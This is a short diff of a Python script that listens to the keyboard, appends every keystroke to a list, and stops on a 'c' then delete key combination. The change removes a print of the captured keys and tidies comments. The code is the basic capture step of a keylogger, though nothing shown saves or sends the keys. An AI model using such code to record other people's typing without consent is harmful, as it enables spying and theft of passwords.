@@ -3,9 +3,9 @@ input_keys = []
 def on_press(key):
     try:
         input_keys.append((key.char))
-        print(input_keys)
     except:
         input_keys.append(str(key))
+
 
 ###     stop monitoring     ###
 def on_release(key):
@@ -21,12 +21,11 @@ def on_release(key):
         ###     pree "c + delete" to stop monitoring       ###
         elif key == keyboard.Key.delete and input_keys[-2] == 'c':
                 return False
-        else:
-            pass
+
     except:
         pass
 
-###     Collect events until released      ###
+###     keyboard listener      ###
 def run_listener():
     with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
         listener.join()
